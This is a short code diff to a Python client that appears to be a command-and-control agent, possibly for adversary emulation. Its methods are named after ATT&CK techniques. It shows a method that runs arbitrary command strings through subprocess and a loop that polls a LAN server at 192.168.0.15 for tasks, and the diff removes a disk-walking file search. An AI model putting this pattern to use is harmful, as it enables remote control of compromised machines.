@@ -21,20 +21,6 @@ class Client:
         
     def t_1059(self, command:str):
         return subprocess.run(command.split(),capture_output=True).stdout.decode()
-    
-    def search(self, name,disks):
-        if not disks:
-            return -1
-        for v in str(disks, "utf-8").split()[1:]:    
-            for dirpath, path, files in os.walk(v+'\\'):
-                if not files:
-                    continue
-                for one_file in files:
-                    if one_file==name:
-                        return f'File - {dirpath+one_file}'
-                    elif path==name:
-                        return f'Directory - {dirpath+path}'
-        return "Not Found"
 
     def t_1083(self, filename):
         if self.os_platf=='windows':
@@ -152,6 +138,7 @@ def main(ip):
                 sleep(5)
 
         while True:
+            res = ''
             req_control_data = requests.get(f'http://192.168.0.15:5000/get_tactic/{ip}')
             if req_control_data.status_code==404:
                 print("Not command!")
